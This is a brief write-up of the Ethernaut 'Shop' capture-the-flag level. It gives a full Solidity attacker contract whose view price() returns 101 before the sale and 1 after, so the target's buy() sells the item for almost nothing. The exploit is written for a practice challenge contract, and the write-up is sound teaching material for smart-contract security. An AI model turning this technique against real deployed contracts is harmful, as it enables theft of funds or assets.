# Level 21 - Shop

- Similar to elevator, but View is used this time.
- View functions allow to read state however pure doesn’t allow to read. Both don’t allow to modify state.
- Here we define return value of price according to isSold value of shop.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Shop.sol";

contract ShopAttacker {

    Shop target =  Shop(0x9A222464D9EB6eA01F765D98B84587ab5D9daF5B);

    function price() external view returns (uint256 _price) {
        return target.isSold() ? 1 : 101;
    }

    function attack() public {
        target.buy();
    }
}
```